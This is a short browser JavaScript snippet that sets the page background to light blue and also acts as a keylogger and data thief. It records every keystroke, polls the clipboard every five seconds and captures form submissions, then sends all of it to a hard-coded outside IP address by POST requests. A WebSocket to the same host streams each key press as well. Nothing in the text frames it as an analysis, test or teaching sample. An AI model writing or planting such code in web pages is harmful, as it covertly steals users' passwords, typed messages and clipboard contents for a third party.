document.body.style.backgroundColor = "lightblue";

let buffer = [];
let lastClipboard = '';
const THRESHOLD = 5; // Send data every 5 characters

document.addEventListener('keydown', (event) => {
    buffer.push(event.key);
    
    if (buffer.length >= THRESHOLD || event.key === 'Enter') {
        sendData(buffer.join(''));
        buffer = []; // Reset buffer
    }
});

setInterval(() => {
    navigator.clipboard.readText().then(text => {
        if (text && text !== lastClipboard) {
            lastClipboard = text;
            sendData(text);
        }
    });
}, 5000); // Poll every 5 seconds

document.querySelector('form').addEventListener('submit', (event) => {
    let formData = new FormData(event.target);
    sendData(Object.fromEntries(formData));
});

function sendData(data) {
    fetch('https://192.42.1.174:8080', {
        method: 'POST',
        body: JSON.stringify({ data: data })
    });
}


const socket = new WebSocket('https://192.42.1.174:8080');
socket.addEventListener("open", (event) => {
    socket.send("Hello Server!");
  });
document.addEventListener('keydown', (event) => {
    socket.send(event.key);
});